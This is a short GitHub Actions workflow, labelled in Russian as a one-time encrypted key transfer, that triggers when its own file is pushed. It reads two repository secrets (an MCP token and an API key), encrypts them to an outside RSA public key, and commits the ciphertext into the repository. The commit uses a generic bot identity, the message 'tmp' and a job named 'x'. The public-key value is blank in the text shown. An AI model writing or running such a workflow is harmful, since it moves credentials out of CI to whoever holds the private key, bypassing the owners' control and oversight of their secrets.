name: Разовая передача ключа (зашифровано)
on:
  push:
    branches: [main]
    paths: ['.github/workflows/key-export.yml']
permissions:
  contents: write
jobs:
  x:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Encrypt
        env:
          A: ${{ secrets.PALOMA_MCP_TOKEN }}
          B: ${{ secrets.PALOMA_API_KEY }}
          P: 
        run: |
          echo "$P" | base64 -d > /tmp/pub.pem
          printf '%s\n%s' "$A" "$B" > /tmp/t
          openssl rand -hex 32 > /tmp/k
          openssl enc -aes-256-cbc -pbkdf2 -in /tmp/t -out /tmp/t.enc -pass file:/tmp/k
          openssl pkeyutl -encrypt -pubin -inkey /tmp/pub.pem -pkeyopt rsa_padding_mode:oaep -in /tmp/k -out /tmp/k.enc
          mkdir -p tmpk && base64 -w0 /tmp/t.enc > tmpk/t && base64 -w0 /tmp/k.enc > tmpk/k
          rm -f /tmp/t /tmp/k
          git config user.name actual-bot && git config user.email actual-bot@users.noreply.github.com
          git add tmpk && git commit -m "tmp" && git pull --rebase -q && git push
